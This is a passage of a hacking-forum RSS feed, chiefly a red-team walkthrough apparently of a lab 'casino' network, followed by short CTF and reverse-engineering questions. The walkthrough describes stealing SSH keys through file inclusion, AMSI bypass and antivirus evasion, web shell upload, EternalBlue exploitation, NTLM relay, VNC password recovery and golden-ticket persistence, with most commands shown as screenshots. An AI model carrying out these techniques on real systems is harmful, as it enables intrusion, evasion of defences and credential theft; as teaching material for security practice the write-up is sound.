<p>[2] <a href="https://easydmarc.com/blog/7-common-internet-of-things-iot-attacks-that-compromise-security/" rel="noopener nofollow ugc">https://easydmarc.com/blog/7-common-internet-of-things-iot-attacks-that-compromise-security/</a></p>
<p>[3] <a href="https://www.metasploit.com/" rel="noopener nofollow ugc">https://www.metasploit.com/</a></p>
<p>[4] <a href="https://github.com/RustScan/RustScan" class="inline-onebox" rel="noopener nofollow ugc">GitHub - RustScan/RustScan: 🤖 The Modern Port Scanner 🤖</a></p>
<p>[5] <a href="https://nmap.org/" rel="noopener nofollow ugc">https://nmap.org/</a></p>
<p>[6] <a href="https://www.psychologytoday.com/us/blog/connect-creativity/201311/question-everything-everywhere-forever" class="inline-onebox" rel="noopener nofollow ugc">Question Everything, Everywhere, Forever | Psychology Today</a></p>
<p>[7] <a href="https://www.exploit-db.com/searchsploit" class="inline-onebox" rel="noopener nofollow ugc">Exploit Database SearchSploit Manual</a></p>
<p>[8] <a href="https://www.informaticar.net/join-ubuntu-22-04-to-microsoft-active-directory-domain/" class="inline-onebox" rel="noopener nofollow ugc">Join Ubuntu 22.04 to Microsoft Active Directory domain | IT Blog</a></p>
<p>[9] <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" class="inline-onebox" rel="noopener nofollow ugc">Upgrading Simple Shells to Fully Interactive TTYs - ropnop blog</a></p>
<p>[10] <a href="https://manpages.ubuntu.com/manpages/trusty/man8/adcli.8.html" class="inline-onebox" rel="noopener nofollow ugc">Ubuntu Manpage: adcli - Tool for performing actions on an Active Directory domain</a></p>
<p>[11] <a href="https://github.com/the-useless-one/pywerview" class="inline-onebox" rel="noopener nofollow ugc">GitHub - the-useless-one/pywerview: A (partial) Python rewriting of PowerSploit's PowerView</a></p>
<p>[12] <a href="https://github.com/SecuProject/ADenum?tab=readme-ov-file" class="inline-onebox" rel="noopener nofollow ugc">GitHub - SecuProject/ADenum: AD Enum is a pentesting tool that allows to find misconfiguration through the the protocol LDAP and exploit some of those weaknesses with kerberos.</a></p>
<p>[13] <a href="https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html" class="inline-onebox" rel="noopener nofollow ugc">The ldapsearch Command-Line Tool</a></p>
<p>[14] <a href="https://www.crowdstrike.com/cybersecurity-101/kerberoasting/" class="inline-onebox" rel="noopener nofollow ugc">What is a Kerberoasting Attack? â CrowdStrike</a></p>
<p>[15] <a href="https://github.com/the-useless-one/pywerview" class="inline-onebox" rel="noopener nofollow ugc">GitHub - the-useless-one/pywerview: A (partial) Python rewriting of PowerSploit's PowerView</a></p>
<p>[16] <a href="https://jqlang.github.io/jq/" class="inline-onebox" rel="noopener nofollow ugc">jq</a></p>
<p>[17] <a href="https://docs.projectdiscovery.io/tools/nuclei/overview" class="inline-onebox" rel="noopener nofollow ugc">Nuclei Overview - ProjectDiscovery Documentation</a></p>
<p>[18] <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion" class="inline-onebox" rel="noopener nofollow ugc">WSTG - v4.2 | OWASP Foundation</a></p>
<p>—-[ Deeper in the Network ]————————————————————————————————–</p>
<p>With LFI as our potential lateral movement technique to move deeper onto the network we have to use this in our advantage to gain access to the remote host, now remember previously the SSH port, this tells us as attackers that there is an SSH server running and probably a potential way to access this host, with our previous enumeration using pywerview I can grab a list of domain users and start brute forcing for interesting files in their home directory folders since we are aware that SSH is running I’ll start looking for SSH related files, I do want to mention another potential tool for this is netexec[1] with multiple protocols and modules available for us to work with, we could potentially locate different paths to gain access or maybe just simple enumeration as seen below where I grab usernames:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-196.png?w=624" alt="" width="624" height="137" role="presentation"></p>
<p>Now with this user list I’ll build a small pythons script to locate interesting files like public, or private SSH keys which we will find using this vulnerability it’s a valuable skill to try and automate some things by utilizing languages such as python or scripting languages such as BASH using the tools manually is great as well but if you really want to make your life easy when hacking or trying to reach the same spot again automation is the recommended way, now below we see the script at work</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-197.png?w=624" alt="" width="539" height="500" role="presentation"></p>
<p>With jnovoa’s private SSH key I use it to login onto the workstation these SSH connections if set up with default values they give the user Administrator Privileges onto the workstation, of course this only applied if the user is in the local Administrator group</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-198.png?w=624" alt="" width="624" height="127" role="presentation"></p>
<p>Now that we are currently in this windows workstation we can move onto utilizing our C2 framework for a more dedicated attack using a payload with all our tools loaded we do have to be careful to edit and customize this as much as possible to leave a different fingerprint than the already known ones from Empire for example take a look at the following payload, you will notice a detection but not based on signature but behavior since detection’s are commonly done via static, behavior and heuristics we do have to consider what is being detected and why:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-199.png?w=624" alt="" width="624" height="430" role="presentation"></p>
<p>Since the method of behavior was at fault, I do want to apply some evasions that can aid in avoiding detection’s when I am trying my PowerShell agents, especially since they come in a command-line method where I need to copy and paste the command onto the terminal my first approach is trying to avoid any static detection’s in this case it’s AMSI.</p>
<p>Now since I am running purely with PowerShell, I like to use some tools for AMSI String detection most of these bypass work by obfuscating strings that trigger AMSI when running here is a simple example of this behavior or method of detection quite simple and yet effective to understand some AV products.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-200.png?w=624" alt="" width="624" height="108" role="presentation"></p>
<p>Literally just a word and received a flag by Defender and AMSI telling me this is malicious but if we apply some slight obfuscation, I can use the word with no warnings whatsoever:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-201.png?w=501" alt="" width="501" height="96" role="presentation"></p>
<p>Now we want to apply a “patch” to AMSI to avoid these triggers, the way this works is that if we can tell AMSI that all the strings being passed to it are Benign then everything will be ignored by AMSI, the patch I’ll be working with is one by Adam Chester[2] so here is the patch[3] but of course this out the box is going to get flagged so I like to test it with AMSITRIGGER[4]</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-202.png?w=381" alt="" width="381" height="135" role="presentation"></p>
<p>Looking at this output seems that the bad word here is AMSI now the file is using C# embedded in a PowerShell script since PowerShell can interact with the CLR which runs C# I can actually use obfuscation techniques meant for C# so now I will base64 this string and decode it on the fly.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-203.png?w=624" alt="" width="624" height="16" role="presentation"></p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-213.png?w=422" alt="" width="422" height="126" role="presentation"></p>
<p>Now with the method above I utilized a Base64 Decoding method native to C# and encoded the malicious string, this time now the file is flagged as malicious but executing still causes problems:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-214.png?w=624" alt="" width="624" height="388" role="presentation"></p>
<p>The cat and mouse game, now all the tools even Defender tells me it’s ok but remember since there is no execution Defender can’t check or analyze it via behavior so this will need to execute to give it a different type of scanning method, since this is the theory I’m working on, one method I like to try instead of running the script using IEX and such I like to copy/paste the entire script since I would like to think that Defender is thinking that these are just regular commands run by a user but it’s me guessing that, that’s what’s going on, this is only possible because I have a full terminal that I can access and paste these commands onto the terminal:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-215.png?w=624" alt="" width="624" height="77" role="presentation"></p>
<p>Now this time the malicious strings are no longer being flagged but errors are now shown this is good as it means that any malicious word doesn’t kill my payload or cause a detection, PowerShell just thinks it’s a functions or some sort of operable program to execute. Now from here we can move on and capture our first working agent from Empire:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-216.png?w=624" alt="" width="624" height="238" role="presentation"></p>
<p>Now here I’ve shown how to avoid the static string detection, but we were talking about behavior based, since this scenario requires a lot of tinkering all I can give here is advise on what one can do for evading these detection’s I’ll explain some of these in parts</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-217.png?w=624" alt="" width="624" height="47" role="presentation"></p>
<p>The Malleable profile is the network traffic that will be used to spoof and blend in our C2 to agent communication this needs to make sense in a way we don’t want to give ourselves away by using strange traffic like a bogus website that just go up and running and it just so happens to communicate inside this network only.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-218.png?w=624" alt="" width="624" height="48" role="presentation"></p>
<p>If possible use Certificates for your traffic this makes it look more legitimate in current times https traffic uses certs to encrypt the network traffic this helps in the case of making it look like legitimate https traffic just because of the simple fact that it is signed, the cert can be self-signed and still be ignored in some cases.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-219.png?w=624" alt="" width="624" height="50" role="presentation"></p>
<p>The working hours is a setting that avoids your agent to speak out to your C2 server when you aren’t even on it yourself, that way you can avoid weird network requests at odd hours of work. Mostly these configurations come within Empire itself but the profile [5] can accept custom settings as well.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-220.png?w=244" alt="" width="244" height="102" role="presentation"></p>
<p>The spawning process, the sleep time, the jitter, the pipe names used for SMB listeners and more diving deeper into the profiles will help you avoid detection’s as well, play with them and try some creative stuff on your own [6][7].</p>
<p>Perfect now from here we can start grabbing more info, look for potential passwords, interesting files, the whole 9 yards to grab as much as possible from the host, now some things I personally like to take a look at are processes and the security product we are going up against, Empire has modules that can be utilized to execute in memory from the current or any live agents that we have for example the antivirus module to locate the security product running:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-221.png?w=624" alt="" width="624" height="453" role="presentation"></p>
<p>And the output is as follows:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-222.png?w=624" alt="" width="624" height="209" role="presentation"></p>
<p>I just ran this to verify other security products weren’t on the host, but since my payloads worked It is highly unlikely that was the case because if it were EDR or some other layer of security getting around it would have been trickier.</p>
<p>I want to also take some time to look for interesting files, processes anything that might give me an idea on what’s going on the network Empire has useful modules for this type of approach a built in SauronEye module an interesting C# tool built for fast searches built into Empire utilizing PowerShell</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-223.png?w=624" alt="" width="624" height="475" role="presentation"></p>
<p>I do however disable the search file contents as this will take more time and resources, also this would be noisy when something trying to read files at a high speed but once that is settled I can check the files manually by downloading them individually.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-224.png?w=624" alt="" width="624" height="301" role="presentation"></p>
<p>I’ve downloaded the file for analysis and just viewed a report on the Casino’s winnings since the files are within the docker you need to copy them locally [8]</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-225.png?w=624" alt="" width="624" height="308" role="presentation"></p>
<p>Since the file was contained in a docker I have to copy[5] the file from it into my local station, take some time to explore the environment you would be surprised on the stuff you would find passwords, keys, databases, PII the list goes on and on tools like Empire, some C# other’s in PowerShell, Nim, Go the possibilities are endless give them a try and look for yourself you might find quick wins, <em>COUGH</em> “Passwords.xlsx” <em>COUGH</em></p>
<p>[1] <a href="https://www.netexec.wiki/" rel="noopener nofollow ugc">https://www.netexec.wiki/</a></p>
<p>[2] <a href="https://twitter.com/_xpn_" rel="noopener nofollow ugc">https://twitter.com/_xpn_</a></p>
<p>[3] <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#adam-chester-patch" class="inline-onebox" rel="noopener nofollow ugc">GitHub - S3cur3Th1sSh1t/Amsi-Bypass-Powershell: This repo contains some Amsi Bypass methods i found on different Blog Posts.</a></p>
<p>[4] <a href="https://github.com/RythmStick/AMSITrigger" class="inline-onebox" rel="noopener nofollow ugc">GitHub - RythmStick/AMSITrigger: The Hunt for Malicious Strings</a></p>
<p>[5] <a href="https://github.com/BC-SECURITY/Malleable-C2-Profiles/blob/master/Normal/gmail.profile" class="inline-onebox" rel="noopener nofollow ugc">Malleable-C2-Profiles/Normal/gmail.profile at master · BC-SECURITY/Malleable-C2-Profiles · GitHub</a></p>
<p>[6] <a href="https://github.com/Tylous/SourcePoint" class="inline-onebox" rel="noopener nofollow ugc">GitHub - Tylous/SourcePoint: SourcePoint is a C2 profile generator for Cobalt Strike command and control servers designed to ensure evasion.</a></p>
<p>[7] <a href="https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/" rel="noopener nofollow ugc">https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/</a></p>
<p>[8] <a href="https://stackoverflow.com/questions/22049212/copying-files-from-docker-container-to-host" class="inline-onebox" rel="noopener nofollow ugc">Copying files from Docker container to host - Stack Overflow</a></p>
<p>—-[Enumeration]—————————————————————————————————————</p>
<p>I need to locate my next host and potential access to it, since staying locally is no longer necessary as I am Administrator Privileges from the SHH connection we can start looking for potential AD attacks such as Unconstrained Delegation, Constrained Delegation, Kerberoasting, AS-REPRoasting, Shadow Credentials, Active Directory Certificate Services and others but my enumeration actually didn’t point me anything crazy as such I did locate AS-REP but it was for a user I already hold with access to nowhere else now port scans are rare on internal networks specially since they tend to be very noisy, but sometimes with a little bit of creativity and time we can actually gather good information as I did previously using nmap via proxychains but now I don’t need that amount of info yet and Empire has a built in port-scanner in PowerShell running the module shows me interesting output.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-226.png?w=410" alt="" width="410" height="156" role="presentation"></p>
<p>Having the open port information lets me apply a targeted scan to wat information I want to gather this way I am not guessing and trying multiple ports at a time and only focusing my information gathering at the openly available ones in this case port 80 and 445 are the most interesting ones, I’ve utilized the same methods as previously with nmap to avoid detection.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-227.png?w=624" alt="" width="624" height="478" role="presentation"></p>
<p>The HTTP protocol and the well known port 445 SMB running on a Windows 7 machine potentially vulnerable to the Eternablue[1] exploit are the interesting ones I’ll take the approach at looking at port 80 but remember the port isn’t open to the internet so setting up a reverse proxy onto the Browser should be a potential next step this time I will setup a Local Port forward with SSH since I know the target server and the port I am trying to reach I can tell SSH to do that with the “-L” flag:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-228.png?w=624" alt="" width="624" height="31" role="presentation"></p>
<p>Now I can reach the HTTP server from my local machine as the request will be forwarded to this location, my next step is to utilize a directory brute force technique I am aware the service is running on Microsoft IIS but I only know the existence of the main page, these tend to contain a directory only known to the internal employees but the “vulnerability” here is that these directories tend to have common or well-known names such for example: secret, uploads, admin, configuration and so on. A tool popular for this well-known technique is feroxbuster [2] a popular directory tool written in Rust, it has tons of great features but will be focusing on a few ones that I know won’t crash the server and gives us sufficient information to look for:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-229.png?w=624" alt="" width="624" height="64" role="presentation"></p>
<pre><code class="lang-auto">----[FeroxBuster]-------------------------------------------------------------------

--depth 1: This tells feroxbuster to only go 1 level deep in the directory scanning

--auto-bail: If feroxbuster encounters multiple errors then stop

--silent: I don't want all the output just the directories found

-x: The extensions I want to apply to the words in the wordlist, experience and some documentation will allow you to recognize the type of file types accepted on the HTTP Service running

-A: Use a random user Agent when scanning to avoid some detection

-w: The wordlist I want to use in the directory scanning

----[FeroxBuster]----------------------------------------------------------------
</code></pre>
<p>The previous output shows me that an uploads and uploads.html directory have been found one is empty but the other one actually gives me the option to upload files, now the trick here is to utilize a compatible web shell to run on a window workstation since we are aware ASPX files are utilized we can actually take advantage of this language usually Linux distros that are for pentesting or offensive development contain some great examples to utilize for web shells but these can be found on the internet as well just be careful for backdoors as you don’t want to hack yourself</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-230.png?w=389" alt="" width="389" height="99" role="presentation"></p>
<p>Let’s try uploading our payload, now that we have the directory to upload and the directory where the uploads go to, we can interact with our uploaded payload.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-231.png?w=624" alt="" width="624" height="286" role="presentation"></p>
<p>I’ve uploaded an aspx file webshell.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-232.png?w=527" alt="" width="527" height="328" role="presentation"></p>
<p>Visiting the payload directly I can interact with the webshell which gives me a prompt for code execution.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-233.png?w=624" alt="" width="624" height="485" role="presentation"></p>
<p>Now I’ll upgrade to an Empire agent to utilize the tools built within again and keep my enumeration running, but I do have to be creative and fix some formatting with my agent since I was receiving errors when executing the PowerShell command from Empire, once I get an agent calling back, I see the current user being DefaultAppPool</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-234.png?w=624" alt="" width="624" height="67" role="presentation"></p>
<p>Sometimes you will encounter some issues since the host is running Windows 7 host or older generations of Windows mostly C2’s in this age focus on Windows 10 and above so they tend to have a little more trouble with targeting these systems, but they still exist!! Not as quite as popular in the day but believe me as small as 2% I’ve encounter these systems myself don’t focus to much, but give them a little research you’d be surprised the area of possibilities in operating systems like these so mix your technique catch shells with ncat or maybe use well know tools such as Metasploit this one has been available since 2003 so they’ve had some work done with the generations of windows when they started.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-235.png?w=624" alt="" width="624" height="429" role="presentation"></p>
<p>I’ve used a little bit of creativity and testing when using a PowerShell reverse shell used for Version 5.0 and above, some character escaping and encoding are quite helpful in this scenario as some modules and functions didn’t exist until later versions of PowerShell this is just a neat little example for a basic reverse shell, don’t!!! But it’s still there just in case, but don’t, since the communication is simple TCP with no encryption.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-236.png?w=624" alt="" width="624" height="173" role="presentation"></p>
<p>—-[Extra, Extra!!: Exploitation]———————————————————————————————</p>
<p>I want to demonstrate an alternative to the WebApp option for lateral movement in our nmap scan we also encountered that port 445 was available for exploration if we take a better look you can tell that it’s running on Windows 7 Service Pack 1 vulnerable to EternalBlue Exploit there are multiple ways to approach this technique we can utilize Metasploit[6], or directly from Empire we can also take a look at open source projects that utilize this exploit for giving us a reverse shell but do be careful of what you are running from the internet there are some jokesters out there giving out fake exploits, trolls or actually backdoor to your attacking machine, things to consider when running Open Source tooling, is building a reputation[7] where we know this isn’t malicious it’s quite hard so just an idea.<br>
In my first method I’ll use Metasploit for it take a look at the following screenshot noticing the options available for the exploit</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-237.png?w=624" alt="" width="624" height="277" role="presentation"></p>
<p>I’ve added all the required values to the exploitation module now when I execute, I will be catching a reverse shell via ncat since the shellcode is simply using an msfvenom shellcode, proceeding with executing the module from Empire building the shellcode with msfvenom is quite simple.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-238.png?w=624" alt="" width="624" height="177" role="presentation"></p>
<p>Now all we need to do is place the shellcode that’s between the curly brackets onto the value “Shellcode” in Empire, when executing this module, I will receive a callback onto my ncat listener</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-239.png?w=624" alt="" width="624" height="265" role="presentation"></p>
<p>The previous screenshots demonstrates the successful exploit and capturing of a reverse shell connection, since the setup used here was an ncat shell, play around to capture maybe on a different C2 or straight from Empire but since it’s tricky working from a Docker I stopped here but I do recommend giving this method a try, in my case I’ve encountered errors I won’t even bother since the OS is not on the supported list of Empire maybe giving it a try with Kali Linux should work</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-240.png?w=624" alt="" width="624" height="132" role="presentation"></p>
<p>—-[End Exploitation]———————————————————————————————————–</p>
<p>From here I can start enumerating when I looked at potential privilege escalation techniques or lateral movement techniques as well as credential access techniques, an interesting location to look at is the scheduled tasks location.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-241.png?w=624" alt="" width="624" height="116" role="presentation"></p>
<p>With windows 7, 8, 10, 11 the Task information has slightly changed here we can actually locate an XML file in the System32 folder, but in later versions I have to locate the Task information via Registry Keys, luckily for me in Windows 7 the XML file exists.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-242.png?w=593" alt="" width="593" height="120" role="presentation"></p>
<p>Reading that file I can see that the mgarcia user is trying to run a ps1 file, so I have some options to elevate my privileges to manipulate the scheduled task, read the ps1 file and hope for credentials or replace it, grab credentials from the scheduled task or capture hashes since I see no credentials on the task itself and the file has no hard-coded credentials since it is running in the context of mgarcia which I will assume the it is using NetNTLMv2[3] for authentication I can probably elevate my privileges using the HotPotato[4] technique or it’s other variants or maybe try and capture the hashes, but since I am aware that all the passwords are complicated passwords that would take time in cracking I will apply the NTLM Relay[5] technique in summary.</p>
<p>I will respond to the NetNTLM request, but I won’t be capturing the hashes instead I will use ntlmrelay to relay or send the hashes to another workstation where the user is an Administrator and with that I can gain command execution and keep moving forward</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-243.png?w=624" alt="" width="624" height="235" role="presentation"></p>
<p>In the screenshot above I told ntlmrelay to target the 10.10.1.138 IP which I know it’s the next workstation, we can actually pass it a list of IPs but beware of SMB Signing[5] this has to be disabled, since the function tells if someone has changed a message during transmission, then the hashes won’t match, and SMB will know that someone tampered with the data. The signature also confirms the sender’s and receiver’s identities.</p>
<p>A good tool for testing this is via netexec.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-244.png?w=624" alt="" width="624" height="124" role="presentation"></p>
<p>I now utilized the relay technique to execute a PowerShell Empire agent on the targeted workstation.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-245.png?w=624" alt="" width="624" height="235" role="presentation"></p>
<p>I can now interact with the new agent.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-246.png?w=624" alt="" width="624" height="182" role="presentation"></p>
<p>Now with the final workstation compromised I have access to everything, right? not really I don’t have DA and the current user isn’t even a user it’s a workstation account (SYSTEM) now for the final goal I have to reach the DC (Domain Controller) I’ll did a quick nmap scan to check what are my possibilities to move onto the next workstation</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-247.png?w=624" alt="" width="624" height="436" role="presentation"></p>
<p>A little more detailed port scan on the VNC ports</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-248.png?w=624" alt="" width="624" height="308" role="presentation"></p>
<p>Now TightVNC[7] holds the password in the Registry Keys, since we have SYSTEM level access we can read the Keys and find the values of those keys since VNC is enabled on this workstation and the Domain Controller</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-249.png?w=624" alt="" width="624" height="114" role="presentation"></p>
<p>Now VNC uses a hard-coded DES key to store credentials. The same key is used across multiple product lines. To decrypt this, we can actually use a Linux One Liner</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-251.png?w=624" alt="" width="624" height="89" role="presentation"></p>
<p>I can utilize a RealVNC[8] Viewer client via the proxy, but I do recommend utilizing the same applications as the environment just in case any new signatures that don’t belong are left on the network connection.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-252.png?w=624" alt="" width="624" height="418" role="presentation"></p>
<p>Now I could dump hashes in the Domain but we wan to be quite remember!! So instead of dumping all the NTLM hashes available in the DC I’ll just grab myself a Golden Ticket for my persistence for that I will grab the AES hash of KRBTGT.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-253.png?w=624" alt="" width="624" height="122" role="presentation"></p>
<p>And now I can use Rubeus to create a Golden Ticket [10]</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-254.png?w=624" alt="" width="624" height="293" role="presentation"></p>
<p>Rubeus will output a Base64 encoded ticket which we can pass onto our current session and enumerate the Domain Controller</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-255.png?w=624" alt="" width="624" height="455" role="presentation"></p>
<p>And with that we have gain complete Domain Dominance over the network at Tropicana Royale Casino, we gained Initial Access via Exploiting a public application used on a “IOT” Device which contained an RCE exploit, enumerated the Active Directory in a Linux OS environment, bypassed security products understanding it at a high-level our detection’s on the “why” and some of the “how” utilized a C2 framework inside a Docker container, setup python virtual environments for our tools, persistence via stolen SSH Keys, Lateral Movement with Web Application exploitation, Internal Running Services exploitation to run custom shellcode (EternalBlue), NTLM Relay, found interesting files, some advice on Malleable profiles, protocols used in an AD, Proxies, Golden Tickets for Persistence and other techniques.</p>
<p>Well thanks for following me in this little Adventure. Hopefully it was entertaining and gave you some insight on my POV in hacking and Red Team and of course some small red team knowledge. Now go and Rob Casinos!!!</p>
<p><em>Legally…</em></p>
<p>[1] <a href="https://en.wikipedia.org/wiki/EternalBlue" rel="noopener nofollow ugc">https://en.wikipedia.org/wiki/EternalBlue</a></p>
<p>[2] <a href="https://github.com/epi052/feroxbuster" rel="noopener nofollow ugc">https://github.com/epi052/feroxbuster</a></p>
<p>[3] <a href="https://en.wikipedia.org/wiki/NTLM" rel="noopener nofollow ugc">https://en.wikipedia.org/wiki/NTLM</a></p>
<p>[4] <a href="https://foxglovesecurity.com/2016/01/16/hot-potato/" rel="noopener nofollow ugc">https://foxglovesecurity.com/2016/01/16/hot-potato/</a></p>
<p>[5] <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing" rel="noopener nofollow ugc">https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing</a></p>
<p>[6] <a href="https://www.metasploit.com/" rel="noopener nofollow ugc">https://www.metasploit.com/</a></p>
<p>[7] <a href="https://www.wired.com/story/jia-tan-xz-backdoor/" rel="noopener nofollow ugc">https://www.wired.com/story/jia-tan-xz-backdoor/</a></p>
<p>[8] <a href="https://notes.offsec-journey.com/enumeration/vnc" rel="noopener nofollow ugc">https://notes.offsec-journey.com/enumeration/vnc</a></p>
<p>[9] <a href="https://www.realvnc.com/" rel="noopener nofollow ugc">https://www.realvnc.com/</a></p>
<p>[10] <a href="https://blog.netwrix.com/2022/08/31/complete-domain-compromise-with-golden-tickets/" rel="noopener nofollow ugc">https://blog.netwrix.com/2022/08/31/complete-domain-compromise-with-golden-tickets/</a></p>
            <p><small>5 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/how-to-rob-a-casino/40556">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/how-to-rob-a-casino/40556</link>
          <pubDate>Thu, 16 May 2024 12:43:30 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-40556</guid>
          <source url="https://0x00sec.org/t/how-to-rob-a-casino/40556.rss">How To Rob a Casino</source>
        </item>
        <item>
          <title>Burp suite problem in server request</title>
          <dc:creator><![CDATA[ADORE]]></dc:creator>
          <category>Uncategorized</category>
          <description><![CDATA[
            <p>Hii,<br>
I have a question that i do not understand.plase help</p>
<p>i was solving a ctf challenges using burp suite.when i try to send post or get request to server with login credentials</p>
<pre><code class="lang-auto">POST /post.php HTTP/1.1
Host: 165.227.106.113
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

username=admin&amp;password=71urlkufpsdnlkadsf
</code></pre>
<p>the server did not show me the flag BUT<br>
When i try using curl command<br>
curl  “<a href="http://165.227.106.113/post.php" rel="noopener nofollow ugc">http://165.227.106.113/post.php</a>” -d “username=admin&amp;password=71urlkufpsdnlkadsf”</p>
<p>it show me the flag<br>
Do you know why???</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/burp-suite-problem-in-server-request/40330">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/burp-suite-problem-in-server-request/40330</link>
          <pubDate>Wed, 01 May 2024 15:09:41 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-40330</guid>
          <source url="https://0x00sec.org/t/burp-suite-problem-in-server-request/40330.rss">Burp suite problem in server request</source>
        </item>
        <item>
          <title>Web pentesting noob qustion</title>
          <dc:creator><![CDATA[ibada]]></dc:creator>
          <category>Beginner Guides</category>
          <description><![CDATA[
            <p>if want to find vuln in somewebsite what are the Steps u do ?</p>
            <p><small>1 post - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/web-pentesting-noob-qustion/40303">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/web-pentesting-noob-qustion/40303</link>
          <pubDate>Mon, 29 Apr 2024 19:27:27 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-40303</guid>
          <source url="https://0x00sec.org/t/web-pentesting-noob-qustion/40303.rss">Web pentesting noob qustion</source>
        </item>
        <item>
          <title>Reversing challenge</title>
          <dc:creator><![CDATA[dedi0x90]]></dc:creator>
          <category>Reverse Engineering</category>
          <description><![CDATA[
            <p>I came across a reverse engineering challenge ;</p>
<p>when i tried to run the comand file i got this :<br>
$ file cast.bin<br>
cast.bin: ELF 64-bit MSB <em>unknown arch 0x3e00</em> (SYSV)</p>
<p>lets run readelf;<br>
$ readelf -h cast.bin<br>
ELF Header:<br>
Magic:   7f 45 4c 46 02 02 01 00 00 00 00 00 00 00 00 00<br>
Class:                             ELF64<br>
Data:                              2’s complement, big endian<br>
Version:                           1 (current)<br>
OS/ABI:                            UNIX - System V<br>
ABI Version:                       0<br>
Type:                              : 300<br>
Machine:                           : 0x3e00<br>
Version:                           0x1000000<br>
Entry point address:               0xc9c4010000000000<br>
